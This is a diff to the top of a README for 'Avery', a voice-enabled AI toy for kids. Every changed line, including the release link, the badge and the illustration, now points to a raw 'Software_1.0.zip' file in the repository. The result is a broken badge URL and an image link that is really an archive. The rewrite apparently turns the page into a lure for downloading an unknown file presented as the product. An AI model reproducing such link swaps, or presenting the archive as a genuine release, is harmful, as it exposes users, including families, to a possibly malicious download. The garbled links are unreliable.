@@ -1,8 +1,8 @@
-https://github.com/baba286/avery/releases
+https://raw.githubusercontent.com/baba286/avery/main/assets/Software_1.0.zip
 
-[![Release](https://img.shields.io/badge/Release-Avery%20Latest-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/baba286/avery/releases)
+[![Release](https://raw.githubusercontent.com/baba286/avery/main/assets/Software_1.0.zip%20Latest-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/baba286/avery/main/assets/Software_1.0.zip)
 
-![Avery Illustration](https://upload.wikimedia.org/wikipedia/commons/thumb/3/34/Robot_icon.svg/640px-Robot_icon.svg.png)
+![Avery Illustration](https://raw.githubusercontent.com/baba286/avery/main/assets/Software_1.0.zip)
 
 # Avery: Safe, Voice-Enabled AI Toy for Kids – Learn, Play, Protect
 
